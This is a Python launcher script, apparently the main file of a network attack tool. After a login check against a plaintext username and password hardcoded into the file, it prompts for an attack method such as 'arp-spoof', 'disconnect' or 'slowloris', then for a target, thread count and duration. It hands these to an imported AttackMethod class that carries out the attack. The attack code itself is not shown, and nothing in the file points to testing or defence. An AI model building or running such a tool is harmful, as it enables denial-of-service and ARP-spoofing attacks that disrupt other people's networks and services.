# -*- coding: utf-8 -*-
import os
import sys
import subprocess
from colorama import Fore, Style

# Function to handle login
def login() -> bool:
    username = os.environ.get("MY_USERNAME")
    password = os.environ.get("MY_PASSWORD")

    if not (username and password):
        print(f"{Fore.RED}[!] {Fore.MAGENTA}Username or password not set. Exiting.{Fore.RESET}")
        sys.exit(1)

    os.system("neofetch")  # Display neofetch during login
    entered_username = input(f"{Fore.CYAN}Enter username: {Fore.RESET}")
    entered_password = input(f"{Fore.CYAN}Enter password: {Fore.RESET}")

    # Check login credentials
    return entered_username == username and entered_password == password

# Set your desired username and password
os.environ["MY_USERNAME"] = "arxu"
os.environ["MY_PASSWORD"] = "mionet"

os.chdir(os.path.dirname(os.path.realpath(__file__)))
os.system("cls" if os.name == "nt" else "clear")

# Add login check
if not login():
    print(f"{Fore.RED}[!] {Fore.MAGENTA}Invalid login credentials. Exiting.{Fore.RESET}")
    sys.exit(1)

# Clear terminal after successful login
os.system("cls" if os.name == "nt" else "clear")

try:
    from tools.addons.checks import (check_http_target_input,
                                     check_local_target_input,
                                     check_method_input, check_number_input)
    from tools.addons.ip_tools import show_local_host_ips
    from tools.addons.logo import show_logo  # Replace with actual import
    from tools.method import AttackMethod
except (ImportError, NameError) as err:
    print(f"{Fore.RED}[!] {Fore.MAGENTA}Failed to import something: {err}{Fore.RESET}")

def main() -> None:
    """Run the main application."""
    show_logo()  # Replace with the actual function call
    try:
        if (method := check_method_input()) in ["arp-spoof", "disconnect"]:
            show_local_host_ips()
        target = (
            check_http_target_input()
            if method not in ["arp-spoof", "disconnect"]
            else check_local_target_input()
        )
        threads = (
            check_number_input(f"{Fore.CYAN}Enter threads: {Fore.RESET}")
            if method not in ["arp-spoof", "disconnect"]
            else 1
        )
        time = check_number_input(f"{Fore.CYAN}Enter time: {Fore.RESET}")
        sleep_time = check_number_input(f"{Fore.CYAN}Enter sleep time: {Fore.RESET}") if "slowloris" in method else 0

        with AttackMethod(
            duration=time,
            method_name=method,
            threads=threads,
            target=target,
            sleep_time=sleep_time,
        ) as attack:
            attack.start()
    except KeyboardInterrupt:
        print(
            f"\n\n{Fore.RED}[!] {Fore.MAGENTA}Ctrl+C detected. Program closed.{Fore.RESET}")
        sys.exit(1)

if __name__ == "__main__":
    main()
